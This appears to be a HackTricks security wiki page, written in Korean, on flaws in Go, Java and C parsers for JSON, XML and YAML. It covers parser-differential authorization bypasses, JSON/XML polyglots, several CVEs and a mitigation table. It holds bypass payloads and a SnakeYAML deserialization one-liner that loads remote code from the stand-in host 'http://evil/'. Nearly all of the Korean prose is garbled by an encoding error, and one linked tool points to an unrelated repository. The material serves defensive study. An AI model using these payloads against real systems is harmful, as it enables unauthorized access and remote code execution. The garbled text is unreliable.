# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

ë‹¤ìŒ ë¬¸ì œë“¤ì€ Go JSONì—ì„œ ë°œê²¬ë˜ì—ˆì§€ë§Œ ë‹¤ë¥¸ ì–¸ì–´ì—ë„ ì¡´ì¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë¬¸ì œë“¤ì€ [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)ì— ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.

Goì˜ JSON, XML, YAML íŒŒì„œëŠ” ì¼ê´€ì„± ë¶€ì¡±ê³¼ ì•ˆì „í•˜ì§€ ì•Šì€ ê¸°ë³¸ ì„¤ì •ì´ ì˜¤ë˜ì „ë¶€í„° ì´ì–´ì ¸ ì™”ìœ¼ë©°, ì´ëŠ” **ì¸ì¦ ìš°íšŒ**, **ê¶Œí•œ ìƒìŠ¹**, ë˜ëŠ” **ë¯¼ê°í•œ ë°ì´í„° ìœ ì¶œ**ì— ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### (Un)Marshaling Unexpected Data

ëª©í‘œëŠ” ê³µê²©ìê°€ ë¯¼ê°í•œ í•„ë“œ(ì˜ˆ: `IsAdmin`, `Password`)ë¥¼ ì½ê±°ë‚˜ ì“¸ ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ëŠ” êµ¬ì¡°ì²´(struct)ë¥¼ ì•…ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

- ì˜ˆì‹œ êµ¬ì¡°ì²´:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- ì¼ë°˜ì ì¸ ì·¨ì•½ì 

1. **íƒœê·¸ ì—†ìŒ** (íƒœê·¸ê°€ ì—†ìœ¼ë©´ = í•„ë“œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì—¬ì „íˆ íŒŒì‹±ë©ë‹ˆë‹¤):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **`-`ì˜ ì˜ëª»ëœ ì‚¬ìš©**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
Payload:
```json
{"-": true}
```
âœ”ï¸ í•„ë“œê°€ (un)marshaled ë˜ëŠ” ê²ƒì„ ì°¨ë‹¨í•˜ëŠ” ì˜¬ë°”ë¥¸ ë°©ë²•:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### íŒŒì„œ ì°¨ì´

ëª©í‘œëŠ” ì„œë¡œ ë‹¤ë¥¸ íŒŒì„œê°€ ë™ì¼í•œ í˜ì´ë¡œë“œë¥¼ ë‹¤ë¥´ê²Œ í•´ì„í•˜ëŠ” ì ì„ ì´ìš©í•´ authorizationì„ bypassí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆ:

- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. ì¤‘ë³µ í•„ë“œ:**
Goì˜ `encoding/json`ëŠ” **ë§ˆì§€ë§‰** í•„ë“œë¥¼ ì·¨í•©ë‹ˆë‹¤.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
ë‹¤ë¥¸ íŒŒì„œ(ì˜ˆ: Javaâ€™s Jackson)ëŠ” **ì²« ë²ˆì§¸ ê°’**ì„ ì„ íƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**2. ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ìŒ:**  
GoëŠ” ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Unicode íŠ¸ë¦­ë„ í†µí•œë‹¤:
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
ìƒìƒí•´ë³´ì:
- Proxyê°€ Goë¡œ ì‘ì„±ë¨
- AuthZ serviceê°€ Pythonìœ¼ë¡œ ì‘ì„±ë¨

Attackerê°€ ë³´ëƒ„:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Pythonì€ `UserAction`ì„ ë³´ê³  í—ˆìš©í•œë‹¤
- GoëŠ” `AdminAction`ì„ ë³´ê³  ì‹¤í–‰í•œë‹¤


### ë°ì´í„° í˜•ì‹ í˜¼ë™ (Polyglots)

ëª©í‘œëŠ” í¬ë§·ì„ í˜¼í•©(JSON/XML/YAML)í•˜ê±°ë‚˜ íŒŒì„œ ì˜¤ë¥˜ ì‹œ fail opení•˜ëŠ” ì‹œìŠ¤í…œì„ ì•…ìš©í•˜ëŠ” ê²ƒì´ë‹¤. ì˜ˆ:
- **CVE-2020-16250**: HashiCorp VaultëŠ” STSê°€ XML ëŒ€ì‹  JSONì„ ë°˜í™˜í•œ í›„ XML íŒŒì„œë¡œ JSONì„ íŒŒì‹±í–ˆë‹¤.

ê³µê²©ìê°€ ì œì–´í•˜ëŠ” í•­ëª©:
- `Accept: application/json` í—¤ë”
- JSON ë³¸ë¬¸ì˜ ì¼ë¶€ ì œì–´

Goì˜ XML íŒŒì„œëŠ” **ì–´ì¨Œë“ ** ì´ë¥¼ íŒŒì‹±í–ˆê³  ì£¼ì…ëœ ì‹ ì›ì„ ì‹ ë¢°í–ˆë‹¤.

- ì œì‘ëœ payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
ê²°ê³¼:
- **Go JSON** íŒŒì„œ: `Action_2` (ëŒ€ì†Œë¬¸ì êµ¬ë¶„í•˜ì§€ ì•ŠìŒ + ë§ˆì§€ë§‰ í•­ëª© ìš°ì„ )
- **YAML** íŒŒì„œ: `Action_1` (ëŒ€ì†Œë¬¸ì êµ¬ë¶„)
- **XML** íŒŒì„œ: ë¬¸ìì—´ ë‚´ë¶€ì˜ `"Action_3"`ì„ íŒŒì‹±í•¨

---

## ì£¼ëª©í•  ë§Œí•œ íŒŒì„œ ì·¨ì•½ì  (2023-2025)

> ë‹¤ìŒ ê³µê°œì ìœ¼ë¡œ ì•…ìš© ê°€ëŠ¥í•œ ì´ìŠˆë“¤ì€ ì•ˆì „í•˜ì§€ ì•Šì€ íŒŒì‹±ì´ ë‹¤ì¤‘ ì–¸ì–´ ë¬¸ì œë¼ëŠ” ê²ƒì„ ë³´ì—¬ì¤€ë‹¤ â€” ë‹¨ì§€ Goë§Œì˜ ë¬¸ì œê°€ ì•„ë‹ˆë‹¤.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* ì˜í–¥ ëŒ€ìƒ: `org.yaml:snakeyaml` < **2.0** (Spring-Boot, Jenkins ë“±ì—ì„œ ì‚¬ìš©ë¨).
* ê·¼ë³¸ ì›ì¸: `new Constructor()`ê°€ **ì„ì˜ì˜ Java í´ë˜ìŠ¤**ë¥¼ ì—­ì§ë ¬í™”í•˜ì—¬ gadget ì²´ì¸ì„ í—ˆìš©í•˜ë©°, ì´ëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŒ.
* ì›ë¼ì´ë„ˆ PoC (ì·¨ì•½í•œ í˜¸ìŠ¤íŠ¸ì—ì„œ ê³„ì‚°ê¸°ë¥¼ ì‹¤í–‰í•¨):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* ìˆ˜ì • / ì™„í™”:
1. **â‰¥2.0ë¡œ ì—…ê·¸ë ˆì´ë“œ** (`SafeLoader`ë¥¼ ê¸°ë³¸ìœ¼ë¡œ ì‚¬ìš©).
2. êµ¬ë²„ì „ì—ì„œëŠ” ëª…ì‹œì ìœ¼ë¡œ `new Yaml(new SafeConstructor())`ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.

### libyaml Double-Free (CVE-2024-35325)

* ì˜í–¥ ë°›ìŒ: `libyaml` â‰¤0.2.5 (ë§ì€ ì–¸ì–´ ë°”ì¸ë”©ì—ì„œ í™œìš©ë˜ëŠ” C ë¼ì´ë¸ŒëŸ¬ë¦¬).
* ë¬¸ì œ: `yaml_event_delete()`ë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•˜ë©´ double-freeê°€ ë°œìƒí•˜ì—¬ ê³µê²©ìê°€ DoSë¡œ ë§Œë“¤ê±°ë‚˜, ì¼ë¶€ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” heap exploitationìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìƒíƒœ: Upstreamì—ì„œ â€œAPI misuseâ€ë¡œ ê±°ë¶€í–ˆì§€ë§Œ, ë¦¬ëˆ…ìŠ¤ ë°°í¬íŒë“¤ì€ ë°©ì–´ì ìœ¼ë¡œ í¬ì¸í„°ë¥¼ null-free ì²˜ë¦¬í•˜ëŠ” íŒ¨ì¹˜ëœ **0.2.6**ì„ ë°°í¬í–ˆìŠµë‹ˆë‹¤.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* ì˜í–¥ ë°›ìŒ: Tencent **RapidJSON** `8269bc2` ì»¤ë°‹ ì´ì „ (<1.1.0-patch-22).
* ì·¨ì•½ì : `GenericReader::ParseNumber()`ì—ì„œ ê²€ì¦ë˜ì§€ ì•Šì€ ì‚°ìˆ  ì—°ì‚°ìœ¼ë¡œ ì¸í•´ ê³µê²©ìê°€ í¬ê²Œ ë²—ì–´ë‚œ ìˆ«ì ë¦¬í„°ëŸ´ì„ ì¡°ì‘í•´ wrap-aroundë¥¼ ë°œìƒì‹œí‚¤ê³  heapì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©° â€” ê²°ê³¼ ê°ì²´ ê·¸ë˜í”„ê°€ ê¶Œí•œ ê²°ì •ì— ì‚¬ìš©ë  ê²½ìš° ê²°êµ­ privilege-escalationì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

---

### ğŸ” ì™„í™”ì±… (ì—…ë°ì´íŠ¸ë¨)

| Risk                                | Fix / Recommendation                                      |
|-------------------------------------|------------------------------------------------------------|
| ì•Œ ìˆ˜ ì—†ëŠ” í•„ë“œ (JSON)               | `decoder.DisallowUnknownFields()`                          |
| ì¤‘ë³µ í•„ë“œ (JSON)                     | âŒ stdlibì—ëŠ” ìˆ˜ì • ì—†ìŒ â€” ê²€ì¦ì„ ìœ„í•´ [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) ì‚¬ìš© |
| ëŒ€ì†Œë¬¸ì ë¬´ì‹œ ë§¤ì¹­ (Go)             | âŒ ìˆ˜ì • ì—†ìŒ â€” struct tagì„ ê²€ì¦í•˜ê³  ì…ë ¥ì„ ì‚¬ì „ ì •ê·œí™”(pre-canonicalize) |
| XML ë¶ˆí•„ìš” ë°ì´í„° / XXE              | ê°•í™”ëœ íŒŒì„œ ì‚¬ìš© (`encoding/xml` + `DisallowDTD`)         |
| YAML ì•Œ ìˆ˜ ì—†ëŠ” í‚¤                   | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | SafeConstructor ì‚¬ìš© / SnakeYAML â‰¥2.0ìœ¼ë¡œ ì—…ê·¸ë ˆì´ë“œ       |
| libyaml â‰¤0.2.5 double-free          | **0.2.6** ë˜ëŠ” ë°°í¬íŒ íŒ¨ì¹˜ ë¦´ë¦¬ìŠ¤ë¡œ ì—…ê·¸ë ˆì´ë“œ             |
| RapidJSON <patched commit           | ìµœì‹  RapidJSON(â‰¥July 2024)ìœ¼ë¡œ ì»´íŒŒì¼                      |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## ì°¸ê³ ìë£Œ

- Baeldung â€“ â€œResolving CVE-2022-1471 With SnakeYAML 2.0â€
- Ubuntu Security Tracker â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
